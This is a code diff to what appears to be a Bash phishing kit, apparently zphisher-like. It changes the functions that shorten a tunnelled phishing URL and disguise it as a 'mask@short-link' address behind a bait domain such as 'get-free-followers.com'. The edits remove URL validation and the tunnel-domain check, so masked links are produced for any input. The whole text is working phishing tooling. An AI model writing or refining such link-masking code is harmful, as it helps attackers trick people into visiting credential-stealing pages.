@@ -460,12 +460,12 @@ custom_mask() {
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url} =~ ^https?://[a-zA-Z0-9.-]+ ]]; then
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
+		if [[ -n "$mask_url" ]]; then
 			mask=$mask_url
 			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid input.. Using the Default one.."
 		fi
 	fi
 }
@@ -490,28 +490,25 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
-		fi
-
-		raw_url="$url"
-		url="https://$raw_url"
-		if [[ $processed_url != "" ]]; then
-			masked_url="$mask@$processed_url"
-			processed_url="https://$processed_url"
-		else
-			processed_url="Unable to Short URL"
-			masked_url="$mask@$raw_url"
-		fi
+	
+	raw_url="$url"
+	url="https://$raw_url"
+	
+	# Try shortening
+	if [[ $(site_stat $isgd) == 2* ]]; then
+		shorten $isgd "$raw_url"
+	elif [[ $(site_stat $shortcode) == 2* ]]; then
+		shorten $shortcode "$raw_url"
 	else
-		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
+		shorten $tinyurl "$raw_url"
+	fi
+
+	if [[ -n "$processed_url" ]]; then
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
 		processed_url="Unable to Short URL"
+		masked_url="$mask@$raw_url"
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
